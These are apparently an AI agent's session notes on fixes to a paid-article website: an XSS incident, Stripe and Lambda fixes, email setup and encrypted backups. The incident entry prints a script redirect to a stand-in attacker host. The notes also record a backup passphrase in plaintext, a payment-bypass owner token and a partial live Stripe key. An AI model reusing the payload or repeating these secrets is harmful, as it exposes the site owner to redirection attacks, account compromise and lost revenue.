# 2026-02-22 â€” Session Notes

## Major Work Done Today

### 1. XSS Incident â€” llm-red-teaming.html
- Article about LLM red teaming had an **unescaped `<script>` tag** in a code example
- `document.location='https://attacker.com/...'` was executing in browsers â†’ redirected visitors to attacker.com's Epik parking page
- Fixed by HTML-escaping: `<script>` â†’ `&lt;script&gt;`
- Deployed immediately to S3 + triggered Amplify build
- Root cause: AI-generated code examples must always have `<script>`, `<iframe>`, `javascript:` properly escaped inside `<pre><code>` blocks

### 2. Lambda API Gateway Fix â€” "Failed to fetch" on success page
- `GET /api/session` was using `AWS` integration (non-proxy) â€” API Gateway was returning Lambda's response object as the body, stripping CORS headers
- Fixed: switched to `AWS_PROXY` integration, deleted+recreated integration clean
- Fixed: `success.html` had `credentials: 'include'` â€” incompatible with wildcard CORS (`*`). Changed to `credentials: 'omit'`
- Fixed: `session.js` only had CORS headers on 200 responses â€” added to all responses via shared `json()` helper
- Redeployed API Gateway to prod stage

### 3. Stripe Checkout â€” `?test=1` not working
- `supply-chain-ai.html` was the only article missing `stripe-checkout.js` â€” its Payment Link button never switched to test mode
- All per-article `*-stripe.js` files were dead code â€” they wired up `#checkout-button-*` IDs that don't exist in any article HTML
- Fixed: added `stripe-checkout.js` to supply-chain-ai.html

### 4. Per-Article PDF Delivery (not bundle)
- Lambda was delivering all PDFs to every buyer regardless of which article they purchased
- Built `stripe-setup.mjs` â€” creates Stripe product + price + payment link per article
- Created 7 test products + 7 live products automatically via Stripe API
- Updated `config.js` with `PRICE_PDF_MAP` (price ID â†’ PDF filename)
- Updated `session.js` and `webhook.js` to expand line items and deliver only the purchased PDF
- Updated `stripe-checkout.js` to use per-article payment links (test + live, keyed by article slug)

### 5. SES Email Setup
- No MX records or verified identities existed at all
- Added SES domain verification TXT + 3 DKIM CNAME records to Route 53
- Set up ImprovMX email forwarding: mark@securebydezign.com + hello@securebydezign.com â†’ markstevenfranklin@gmail.com
- Verified mark@, hello@, and the domain itself in SES
- SES production access request submitted (pending AWS approval)

### 6. Stripe Webhook Secret Fix
- `STRIPE_WEBHOOK_SECRET` was set to `sk_test_...` (wrong â€” should be `whsec_...`)
- Mark fixed this in AWS Console
- Added `STRIPE_LIVE_WEBHOOK_SECRET` for live webhook endpoint
- Lambda now tries live secret first, falls back to test â€” single endpoint handles both

### 7. Test/Live Key Routing in Lambda
- Lambda now auto-detects `cs_test_` vs `cs_live_` prefix on session IDs
- Uses `STRIPE_SECRET_KEY` for test, `STRIPE_LIVE_SECRET_KEY` for live
- Live Stripe secret key: `sk_live_51T3M...` (stored in Lambda env)

### 8. Owner Unlock Button
- Added `js/owner-unlock.js` â€” visit any article with `?owner=sbdz-mk26` once
- Stores token in localStorage, shows floating ðŸ”“ Unlock PDF button on all articles
- Links directly to the PDF, bypasses payment

### 9. Tiered Memory Storage
- Created S3 bucket `pax-memory-sbdz` (private)
- SQLite FTS5 hot store: `memory/hot.db` â€” indexes all markdown memory files
- Scripts: `memory/bin/ingest.py`, `memory/bin/search.py`, `memory/bin/archive.py`
- Cron: ingest daily at 3AM, archive weekly Sundays at 2AM
- Search: `python3 memory/bin/search.py "query"` â€” hot first, falls back to cold S3

### 10. Full Backup System
- Daily encrypted S3 backup at 2AM to `s3://pax-memory-sbdz/backups/YYYY-MM-DD/`
- Workspace plaintext + secrets AES-256 encrypted + cron jobs + manifest
- Passphrase: `imtqk-gvgsa-kyegp-pdjtf-2333` â€” Mark saved in LastPass + macOS Passwords
- Passphrase also stored in macOS Keychain (`pax-backup` / `pax`)
- Restore script: `memory/bin/restore.sh` â€” full recovery in ~10 minutes from fresh Mac
- First backup completed and verified in S3 today

## Key Decisions
- One Stripe product per article (not a shared bundle) â€” cleanest for per-article PDF delivery
- ImprovMX for email forwarding (simplest, no new inbox to manage)
- SQLite FTS5 over vector DB â€” no OpenAI dependency, works offline, fast
- AES-256 + openssl for backup encryption â€” no additional dependencies
